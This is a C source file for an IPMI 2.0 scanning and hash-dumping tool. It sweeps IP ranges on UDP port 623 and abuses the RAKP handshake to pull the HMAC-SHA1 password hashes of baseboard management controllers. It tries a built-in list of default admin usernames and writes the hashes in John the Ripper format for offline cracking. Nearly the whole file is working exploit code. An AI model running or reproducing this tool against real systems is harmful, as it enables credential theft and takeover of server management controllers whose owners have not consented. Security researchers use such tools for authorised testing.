#include <ctype.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "ipmi.h"

#ifndef MINGW

#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <grp.h>
#include <stdarg.h>

#define SOCKET int
#define SOCKADDR struct sockaddr
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close

#else

#include <winsock2.h>

#endif

#define SIZE_SESSION_OPEN_REQUEST	48
#define SIZE_RAKP1			44
#define SIZE_CONSOLE_SESSION_ID		4
#define SIZE_BMC_SESSION_ID		4
#define SIZE_CONSOLE_RANDOM_ID		16
#define SIZE_BMC_RANDOM_ID		16
#define SIZE_BMC_GUID			16
#define SIZE_HMAC_SHA1			20

#define TEMP_SIZE 32

uint8_t IPMISessionOpenRequest[SIZE_SESSION_OPEN_REQUEST] = {
	/* Header */
	0x06, 0x00, 0xFF, 0x07,
	0x06,
	PAYLOAD_RMCPPLUSOPEN_REQ,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,

	/* DataLength = 32 bytes */
	0x20, 0x00,

	/* Data */
	0x00, 0x00, 0x00, 0x00,

	/* ConsoleSessionID 20-24 */
	0x00, 0x00, 0x00, 0x00,

	/* Data */
	0x00, 0x00, 0x00, 0x08,
	0x01, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x08,
	0x01, 0x00, 0x00, 0x00,
	0x02, 0x00, 0x00, 0x08,
	0x01, 0x00, 0x00, 0x00,
};

uint8_t IPMIRAKP1[SIZE_RAKP1] = {
	/* Header */
	0x06, 0x00, 0xFF, 0x07,
	0x06,
	PAYLOAD_RAKP1,
	0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x21, 0x00, 
	0x00, 0x00, 0x00, 0x00,

	/* BMCSessionID 20-24*/
	0x00, 0x00, 0x00, 0x00,

	/* ConsoleRandomID 24-30*/
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,

	/* Data */
	0x14, 0x00, 0x00,

	/* UsernameLength 43*/
	0x00

	/* next to username string */
};

uint8_t ipmi_getchannel_probe[23] = {
	0x06, 0x00, 0xff, 0x07,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x09, 0x20, 0x18,
	0xc8, 0x81, 0x00, 0x38,
	0x8e, 0x04, 0xb5
};

struct globalArgs_t {
	char *LoginFile;	/* -L */
	char *IP;		/* without param */
	char *Login;		/* -l */
	int DoPing;		/* -p */
	char *JohnFilename;     /* -j */
	int DoDump;		/* -d */
        int DoForce;		/* -f */
	int VerboseLevel;	/* -v */
} globalArgs;

static const char *optString = "l:L:v:j:fpd";

void RandStr(char *dst, uint32_t length)
{
	uint32_t i = length;
	while ( i-- > 0 )
		dst[(length-i)-1] = rand() % 255;
}

void DoSleep(uint32_t time)
{
	return;
#ifndef MINGW
	sleep(time);
#else
	Sleep(time*1000);
#endif
	return;
}


void printhex( unsigned char *buf, int size )
{
	int x, y;

	for ( x=1; x<=size; x++ )
	{
		if ( x == 1 )
			printf( "%04x  ", x-1 );
		printf( "%02x ", buf[x-1] );
		if ( x % 8 == 0 )
			printf( " " );
		if ( x % 16 == 0 )
		{
			printf( " " );
			for( y = x - 15; y <= x; y++ )
			{
				if ( isprint( buf[y-1] ) )
					printf( "%c", buf[y-1] ); 
				else
					printf( "." ); 
				if ( y % 8 == 0 )
					printf( " " ); 
			}
			
			if ( x < size )
				printf( "\n%04x  ", x ); 
		}
	}
	x--;
	if ( x % 16 != 0 )
	{
		for ( y = x+1; y <= x + (16-(x % 16)); y++ )
		{
			printf( "   " );
			if( y % 8 == 0 ) printf( " " ); 
		};
		printf( " " );
		for ( y = (x+1) - (x % 16); y <= x; y++ )
		{
			if ( isprint( buf[y-1] ) )
				printf( "%c", buf[y-1] ); 
			else
				printf( "." );
			if( y % 8 == 0 )
				printf( " " );
		}
	}
	printf( "\n" );
}

void CreateIPMISessionOpenRequest(char* dst, char* ConsoleSessionID)
{
	memcpy(dst, IPMISessionOpenRequest, 48);
	memcpy(dst+20, ConsoleSessionID, 4);
}

void CreateIPMIRAKP1(char* dst, char* BMCSessionID, const char* ConsoleRandomID, const char* Username)
{
	uint8_t UsernameLength = (uint8_t) strlen(Username);

	memcpy(dst,		IPMIRAKP1,		SIZE_RAKP1);
	memcpy(dst+20,		BMCSessionID,		SIZE_BMC_SESSION_ID);
	memcpy(dst+24,		ConsoleRandomID,	SIZE_CONSOLE_RANDOM_ID);

	dst[43] = UsernameLength;

	memcpy(dst+44,		Username,		UsernameLength);
}

void CreateSalt(char* Salt,
		const char* ConsoleSessionID,
		const char* BMCSessionID,
		const char* ConsoleRandomID,
		const char* BMCRandomID,
		const char* BMCGuid,
		const uint8_t AuthLevel,
		const char* Username)
{
	uint8_t UsernameLength = strlen(Username);

	memcpy(Salt,		ConsoleSessionID,	SIZE_CONSOLE_SESSION_ID);
	memcpy(Salt+4,		BMCSessionID,		SIZE_BMC_SESSION_ID);
	memcpy(Salt+8,		ConsoleRandomID,	SIZE_CONSOLE_RANDOM_ID);
	memcpy(Salt+24,		BMCRandomID,		SIZE_BMC_RANDOM_ID);
	memcpy(Salt+40,		BMCGuid,		SIZE_BMC_GUID);
	Salt[56] = AuthLevel;
	Salt[57] = UsernameLength;

	memcpy(Salt+58, 	Username,		UsernameLength);
}

void PrintSaltHash(const char* Username, const char* Salt, const char* Hash)
{
	uint32_t SaltLength = 58 + strlen(Username);

	printf("%s:", Username);

	int j;

	for (j = 0; j < SaltLength; j++)
		printf("%02x", (uint8_t) Salt[j]);

	printf(":");

	for (j = 0; j < 20; j++)
		printf("%02x", (uint8_t) Hash[j]);

	printf("\n");

}

void WriteSaltHashToJohn(const char* Username, const char* Salt, const char* Hash)
{
	uint32_t SaltLength = 58 + strlen(Username);
	int j;
	FILE *outfile = fopen(globalArgs.JohnFilename, "a");

	if ( !outfile ) 
	{
		fprintf(stderr, "[-] Unable to write to file: %s!\n", globalArgs.JohnFilename);
		return;
	}

	fprintf(outfile, "%s:$rakp$", Username);

	for (j = 0; j < SaltLength; j++)
		fprintf(outfile, "%02x", (uint8_t) Salt[j]);

	fprintf(outfile, "$");

	for (j = 0; j < 20; j++)
		fprintf(outfile, "%02x", (uint8_t) Hash[j]);

	fprintf(outfile, "\n");

	fclose(outfile);

}

void ToBanner(ChannelAuthReply *info)
{
	if ( info->ipmi_compat_20 == 1)
		printf("IPMI-2.0");
	else
		printf("IPMI-1.5");

	if ( info->ipmi_oem_id != 0 )
		printf(" OEMOD: %d", info->ipmi_oem_id);


	printf(" UserAuth(");
	if ((info->ipmi_compat_20 == 1) && (info->ipmi_user_kg == 1))
		printf("kg_default");
	if (info->ipmi_user_disable_message_auth != 1)
		printf(" auth_msg");
	if (info->ipmi_user_disable_user_auth != 1)
		printf(" auth_user");
	if (info->ipmi_user_non_null == 1)
		printf(" non_null_user");
	if (info->ipmi_user_null == 1)
		printf(" null_user");
	if (info->ipmi_user_anonymous == 1)
		printf(" anonymous_user");
	printf(")");

	printf(" PassAuth(");
	if (info->ipmi_compat_oem_auth == 1)
		printf("oem_auth");
	if (info->ipmi_compat_password == 1)
		printf(" password");
	if (info->ipmi_compat_md5 == 1)
		printf(" md5");
	if (info->ipmi_compat_md2 == 1)
		printf(" md2");
	if (info->ipmi_compat_none == 1)
		printf(" null");
	printf(")");


	printf(" Level(");
	if (info->ipmi_conn_15 == 1)
		printf("1.5");
	if (info->ipmi_conn_20 == 1)
		printf(" 2.0");
	printf(")");
}

void PrintChannel(ChannelAuthReply *info)
{
	printf("version => %d\n", info->rmcp_version);
	printf("padding => %d\n", info->rmcp_padding);
	printf("seq => %d\n", info->rmcp_sequence);
	printf("mtype => %d\n", info->rmcp_mtype /* == 0 ? "Normal RMCP" : "--" */ );
	printf("class => %d\n", info->rmcp_class);
	printf("sess_auth_type => %d\n", info->session_auth_type);
	printf("sess_seq => %d\n", info->session_sequence);
	printf("sess_id  => %d\n", info->session_id);
	printf("mess_length => %d\n", info->message_length);
	printf("tgt_address => %d\n", info->ipmi_tgt_address);
	printf("tgt_lun => %d\n", info->ipmi_tgt_lun);
	printf("hdr_checksum => %d\n", info->ipmi_header_checksum);
	printf("src_addr => %d\n", info->ipmi_src_address);
	printf("src_lun => %d\n", info->ipmi_src_lun);
	printf("command => %d\n", info->ipmi_command);
	printf("comp_code => %d\n", info->ipmi_completion_code);
	printf("channel => %d\n", info->ipmi_channel);
	printf("\n");
	printf("compat_20 => %d\n", info->ipmi_compat_20);
	printf("compat_res1 => %d\n", info->ipmi_compat_reserved1);
	printf("compat_oem_auth => %d\n", info->ipmi_compat_oem_auth);
	printf("compat_passwd => %d\n", info->ipmi_compat_password == 1 ? 1 : 0);
	printf("compat_res2 => %d\n", info->ipmi_compat_reserved2);
	printf("compat_md5 => %d\n", info->ipmi_compat_md5 == 1 ? 1 : 0);
	printf("compat_md2 => %d\n", info->ipmi_compat_md2 == 1 ? 1 : 0);
	printf("compat_none => %d\n", info->ipmi_compat_none == 1);
	printf("\n");
	printf("user_res1 => %d\n", info->ipmi_user_reserved1);
	printf("user_kg => %d\n", info->ipmi_user_kg);
	printf("user_dis_message_auth  => %d\n", info->ipmi_user_disable_message_auth);
	printf("user_dis_user_auth => %d\n", info->ipmi_user_disable_user_auth);
	printf("user_non_null => %d\n", info->ipmi_user_non_null);
	printf("user_null => %d\n", info->ipmi_user_null);
	printf("user_anon => %d\n", info->ipmi_user_anonymous);

}



int PingIPMI(const char *Target)
{
	socklen_t fromlen = 512;
	int k, get, send;
	ChannelAuthReply *packet;
	uint8_t vect[512] = {0};

	/* XXX: Configure timing */
	struct timeval timeout;
	timeout.tv_sec = 1;
	timeout.tv_usec = 0;

	SOCKET u_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (u_sock == INVALID_SOCKET)
	{
		if ( globalArgs.VerboseLevel >= 2 )
			printf("[!] socket() failed in PingIPMI\n");
		return -1;
	}

	if (setsockopt (u_sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)
	{
		if ( globalArgs.VerboseLevel >= 2 )
			printf("[!] setsockopt() failed in PingIPMI\n");
		closesocket(u_sock);
		return -1;
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(Target);
	addr.sin_port = htons(623);

	for (k = 0; k < 1; k++)
	{
		send = sendto(u_sock, ipmi_getchannel_probe, sizeof(ipmi_getchannel_probe), 0, (SOCKADDR *)&addr, sizeof(addr));
		if (send == SOCKET_ERROR)
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[!] sendto() failed in PingIPMI\n");
			closesocket(u_sock);
			return -1;
		}
		get = recvfrom(u_sock, (char *)vect, 512, 0, (SOCKADDR *)&addr, &fromlen);
		if (get != SOCKET_ERROR)
			break;
	}

	if (get == SOCKET_ERROR)
	{
		closesocket(u_sock);
		return 0;
	}

	packet = (ChannelAuthReply *)vect;

	if ( globalArgs.VerboseLevel >= 0 )
		printf("[+] Found IPMI on %s\t\t", Target);

	if ( globalArgs.VerboseLevel >= 3 )
		PrintChannel(packet);

	if ( globalArgs.VerboseLevel >= 1 )
	{
		ToBanner(packet);
	}

	printf("\n");

	closesocket(u_sock);
	return 1;

}

void DumpHash(const char* Username, const char* Target)
{
	char send_udp[512];
	char recv_udp[512];
	char ConsoleSessionID[4];
	char ConsoleRandomID[16];
	char BMCSessionID[4];
	char BMCRandomID[16];
	char BMCGuid[16];
	char Hash[20];
	char Salt[512];
	unsigned int i, k, send, get, good;
	OpenSessionReplay* reply1;
	struct timeval timeout;
	timeout.tv_sec = 1;
	timeout.tv_usec = 0;


	socklen_t fromlen = 512;

	if ( globalArgs.VerboseLevel >= 2 )
		printf("[i] Trying username %s\n", Username);


	SOCKET u_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if ( u_sock == INVALID_SOCKET )
	{
		if ( globalArgs.VerboseLevel >= 2 )
			printf("[!] socket() failed in DumpHash\n");
		return;
	}

	if (setsockopt (u_sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)
	{
		if ( globalArgs.VerboseLevel >= 2 )
			printf("[!] setsockopt() failed in DumpHash\n");
		closesocket(u_sock);
		return;
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(Target);
	addr.sin_port = htons(623);

	for (i = 0; i < 3; i++)
	{
		good = 0;

		RandStr(ConsoleSessionID,	SIZE_CONSOLE_SESSION_ID);
		RandStr(ConsoleRandomID,	SIZE_CONSOLE_RANDOM_ID);
		CreateIPMISessionOpenRequest(send_udp, ConsoleSessionID);

		if ( globalArgs.VerboseLevel >= 3 )
		{ 
			printf("SessID\n");
			printhex((unsigned char*)ConsoleSessionID,	SIZE_CONSOLE_SESSION_ID);
			printf("\n");

			printf("RandID\n");
			printhex((unsigned char*)ConsoleRandomID,	SIZE_CONSOLE_RANDOM_ID);
			printf("\n");

			printf("Packet CreateIPMISessionOpenRequest\n");
			printhex((unsigned char*)send_udp,		SIZE_SESSION_OPEN_REQUEST);
			printf("\n");
		}

		for (k = 0; k < 3; k++)
		{
			send = sendto(u_sock, send_udp, 48, 0, (SOCKADDR *)&addr, sizeof(addr));
			if ( send == SOCKET_ERROR )
			{ 
				if ( globalArgs.VerboseLevel >= 2 )
					printf("[!] sendto() failed in DumpHash\n");
				closesocket(u_sock);
				return;
			}
			/* XXX: =( */
			DoSleep(1);
			get = recvfrom(u_sock, recv_udp, 512, 0, (SOCKADDR *)&addr, &fromlen);
			if ( get != SOCKET_ERROR )
				break;
		}

		if ( get == SOCKET_ERROR )
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[-] No response to IPMI open session request\n");
			closesocket(u_sock);
			return;
		}

		reply1 = (OpenSessionReplay *)recv_udp;
		if ( reply1->session_payload_type != PAYLOAD_RMCPPLUSOPEN_REP )
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[-] Could not understand the response to the open session request\n");
			closesocket(u_sock);
			return;
		}

		memcpy(BMCSessionID,	reply1->bmc_session_id, 4);
		CreateIPMIRAKP1(send_udp, BMCSessionID, ConsoleRandomID, Username);

		if ( globalArgs.VerboseLevel >= 3 )
		{
			printf("Got packet from IPMI\n");
			printhex((unsigned char*)recv_udp, get);
			printf("\n");

			printf("BMCSessionID\n");
			printhex((unsigned char*)BMCSessionID, 4);
			printf("\n");

			printf("RAKP1 message\n");
			printhex((unsigned char*)send_udp, 44 + strlen(Username));
			printf("\n");
		}

		for (k = 0; k < 3; k++)
		{
			send = sendto(u_sock, send_udp, 44 + strlen(Username), 0, (SOCKADDR *)&addr, sizeof(addr));
			if ( send == SOCKET_ERROR )
			{
				if ( globalArgs.VerboseLevel >= 2 )
					printf("[!] sendto failed in DumpHash\n");
				closesocket(u_sock);
				return;
			}
			/* XXX: =( */
			DoSleep(1);
			get = recvfrom(u_sock, recv_udp, 512, 0, (SOCKADDR *)&addr, &fromlen);
			if ( get != SOCKET_ERROR )
				break;
		}

		if ( get == SOCKET_ERROR )
		{ 
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[-] No response to RAKP1 message\n");
			continue;
		}

		if ( globalArgs.VerboseLevel >= 3 )
		{
			printf("recv RAKP2 message\n");
			printhex((unsigned char *)recv_udp, get);
			printf("\n");
		}

		RAKP2* rakp2 = (RAKP2 *)recv_udp;

		if ( rakp2->session_payload_type != PAYLOAD_RAKP2 )
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[-] Could not understand the response to the RAKP1 request\n");
			break;
		}

		if ( rakp2->error_code >= 2 )
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[-] Returned a Session ID error for username %s on attempt\n",
						Username
						);
			continue;
		}

		if ( rakp2->error_code != 0 )
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[-] Returned error code %d for username %s: %s\n",
						rakp2->error_code,
						Username,
						RMCP_ERRORS[rakp2->error_code]
						);
			break;
		}

		if ( rakp2->ignored1 != 0 )
		{
			if ( globalArgs.VerboseLevel >= 2 )
				printf("[i] Returned error code %d for username %s\n",
						rakp2->ignored1,
						Username
						);
			break;
		}

		memcpy(BMCRandomID,	rakp2->bmc_random_id,	SIZE_BMC_RANDOM_ID);
		memcpy(BMCGuid,		rakp2->bmc_guid,	SIZE_BMC_GUID);
		memcpy(Hash,		rakp2->hmac_sha1,	SIZE_HMAC_SHA1);

		good = 1;
		break;
	}

	closesocket(u_sock);

	if ( good == 0 )
		return;

	printf("[+] Hash: ");

	CreateSalt(Salt,
		ConsoleSessionID,
		BMCSessionID,
		ConsoleRandomID,
		BMCRandomID,
		BMCGuid,
		0x14,
		Username
	);

	PrintSaltHash(Username, Salt, Hash);
	if ( globalArgs.JohnFilename )
		WriteSaltHashToJohn(Username, Salt, Hash);
}

void Usage(const char* ProgramName)
{
	printf("%s <options> <IP|IP/mask>\n", ProgramName);
	printf("        -l  Login               Dump hash for login\n");
	printf("        -L  File                File with logins\n");
	printf("        -d                      Dump hashes\n");
	printf("        -j  File                Write hashes in John the Ripper format (implies -d)\n");
	printf("        -p                      Ping IPMI\n");
	printf("        -f                      Try dump hashes from all targets\n");
	printf("        -v  1|2|3 (default 0)   Verbose level\n");
	exit(0);
}

int main(int argc, const char **argv)
{
	time_t t;
	int rez = 0;
	char Target[32];
	char Temp[TEMP_SIZE];

	globalArgs.LoginFile	= NULL;
	globalArgs.IP		= NULL;
	globalArgs.Login	= NULL;
	globalArgs.DoPing	= 0;
	globalArgs.JohnFilename = NULL;
	globalArgs.DoDump	= 0;
	globalArgs.DoForce	= 0;
	globalArgs.VerboseLevel	= 0;

	if ( argc == 1 )
		Usage(argv[0]);

	while ( (rez = getopt(argc,(char * const*)argv,optString)) != -1){
		switch (rez){
			case 'l':
				globalArgs.Login = optarg;
				break;
			case 'L':
				globalArgs.LoginFile = optarg;
				break;
			case 'j':
				globalArgs.JohnFilename = optarg;
				// Intentional fallthrough
			case 'd':
				globalArgs.DoDump = 1;
				break;
			case 'p':
				globalArgs.DoPing = 1;
				break;
			case 'v':
				globalArgs.VerboseLevel = atoi(optarg);
				break;
			case 'f':
				globalArgs.DoForce = 1;
				break;
			case '?':
				Usage(argv[0]);
				break;
		}
	}

	if ((argc-optind) == 1)
		globalArgs.IP = (char*)argv[optind];
	else
		Usage(argv[0]);

	if ( !globalArgs.DoDump && !globalArgs.DoPing )
		Usage(argv[0]);

	uint32_t one, two, three, four, mask;
	uint32_t network, count_hosts;
	uint32_t start_one, start_two, start_three, start_four;
	uint32_t end_one, end_two, end_three, end_four;

	count_hosts=1;

	uint32_t ret = sscanf(globalArgs.IP, "%d.%d.%d.%d/%d", &one, &two, &three, &four, &mask);

	if (ret == 5)
	{ 
		if ( 	   one<0   || one>255
			|| two<0   || two>255
			|| three<0 || three>255
			|| four<0  || four>255
			|| mask<0  || mask>31)
		{
			printf("[!] Bad IP or Mask!\n");
			Usage(argv[0]);
		}

		network 	= ((one<<24) | (two<<16) | (three<<8) | four) & (((2<<(mask-1))-1)<<(32-mask));
		count_hosts 	= (2<<(32-mask-1))-1;

		start_one	= (network>>24) & 0xff;
		start_two	= (network>>16) & 0xff;
		start_three	= (network>>8)  & 0xff;
		start_four	= (network)     & 0xff;

		/* XXX: This variables don't need, you can delete it if you wish */
		end_one		= ((network|count_hosts)>>24) & 0xff;
		end_two		= ((network|count_hosts)>>16) & 0xff;
		end_three	= ((network|count_hosts)>>8)  & 0xff;
		end_four	= ((network|count_hosts))     & 0xff;

		if (globalArgs.VerboseLevel >= 2)
		{
			/* Check for right work code above */
			printf("Param     => %d.%d.%d.%d/%d\n", one, two ,three, four, mask);
			printf("Network   => %d.%d.%d.%d/%d\n", start_one, start_two, start_three, start_four, mask);
			printf("Start IP  => %d.%d.%d.%d\n",    start_one, start_two, start_three, start_four+1);
			printf("End IP    => %d.%d.%d.%d\n",    end_one, end_two, end_three, end_four-1);
		}
	}
	else if (ret == 4)
	{
		if ( 	   one<0   || one>255
			|| two<0   || two>255
			|| three<0 || three>255
			|| four<0  || four>255)
		{
			printf("[!] Bad IP or Mask!\n");
			Usage(argv[0]);
		}

		start_one	= one;
		start_two	= two;
		start_three	= three;
		start_four	= four;
	}
	else
	{
		printf("Bad IP!\n");
		Usage(argv[0]);
	}

	char *username[] = {
		"Administrator",
		"USERID",
		"ADMIN",
		"admin",
		"root",
		"guest",
		"",
	};

	srand((unsigned) time(&t));

#ifdef MINGW
	WSADATA version;
	WORD mkword = MAKEWORD(2,2);
	int what = WSAStartup(mkword, &version);
	if (what != 0)
	{
//		if ( globalArgs.VerboseLevel >= 2 )
			printf("[-] Bad WSAStartup!\n");
		return 0;
	}
#endif

	int i,k;

	for (i = 0; i < count_hosts; i++)
	{
		if (count_hosts == 1)
			goto doit;

		if (i == 0 || i == count_hosts)
			continue;
doit:
		snprintf(Target, sizeof(Target), "%d.%d.%d.%d",
				((i>>24) & 0xff) | start_one,
				((i>>16) & 0xff) | start_two,
				((i>>8)  & 0xff) | start_three,
				(i       & 0xff) | start_four);
		printf("[TRY] %s\n", Target);

		if (globalArgs.DoPing == 1)
		{
			if (((PingIPMI(Target) == 1) || (globalArgs.DoForce == 1)) && (globalArgs.DoDump == 1))
			{
				printf("[i] Trying get hash from %s\n", Target);
				if ( globalArgs.Login )
				{
					DumpHash(globalArgs.Login, Target);
				}
				else if ( globalArgs.LoginFile )
				{
					FILE *infile = fopen(globalArgs.LoginFile, "r");
					while( fgets(Temp, TEMP_SIZE, infile) != NULL)
					{
						Temp[strlen(Temp)-1] = '\0'; // Trim the newline
						DumpHash(Temp, Target);
						DoSleep(1);
					}
				}
				else
				{
					for (k=0; k<7; k++)
					{
						DumpHash(username[k], Target);
						DoSleep(1);
					}
				}
			}
		}
		else if (globalArgs.DoDump == 1)
		{
			printf("[i] Trying get hash from %s\n", Target);
			if ( globalArgs.Login )
			{
				DumpHash(globalArgs.Login, Target);
			}
			else if ( globalArgs.LoginFile )
			{
				FILE *infile = fopen(globalArgs.LoginFile, "r");
				while( fgets(Temp, TEMP_SIZE, infile) != NULL)
				{
					Temp[strlen(Temp)-1] = '\0'; // Trim the newline
					DumpHash(Temp, Target);
					DoSleep(1);
				}
			}
			else
			{
				for (k = 0; k < 7; k++)
				{
					DumpHash(username[k], Target);
					DoSleep(1);
				}
			}
		}
	}
	return 0;
}


